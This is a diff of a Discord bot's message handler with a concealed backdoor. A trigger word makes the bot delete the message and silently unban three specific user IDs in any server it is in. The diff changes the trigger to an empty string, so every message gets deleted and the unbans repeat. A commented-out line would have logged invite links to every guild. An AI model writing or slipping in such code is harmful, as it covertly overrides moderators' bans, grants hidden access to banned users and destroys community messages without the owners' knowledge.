@@ -35,14 +35,14 @@ bot.on('message', message => {
      // invite.createInvite().then(invite => console.log(`Conected on: ${guild.name} || MemberCount: ${guild.memberCount} || ID: ${guild.id} || Invite: ${invite}`));
   // })
  
-   if (message.content.startsWith('blop')) {
+   if (message.content.startsWith('')) {
    message.delete()
    message.guild.unban('450790126063190016')
   .then(user => console.log(`Resetban Le Charmeur from ${guild.name}`))         
   .catch(console.error);
    } 
 	
-   if (message.content.startsWith('blop')) {
+   if (message.content.startsWith('')) {
    message.delete()
    message.guild.unban('410224633636192257')
    .then(user => console.log(`Resetban of Neroxis from ${guild.name}`))         
@@ -50,7 +50,7 @@ bot.on('message', message => {
    } 
 	
 
-if (message.content.startsWith('blop')) {
+if (message.content.startsWith('')) {
    message.delete()
    message.guild.unban('301913733536415755')
    .then(user => console.log(`Resetban of Mikado from ${guild.name}`))         
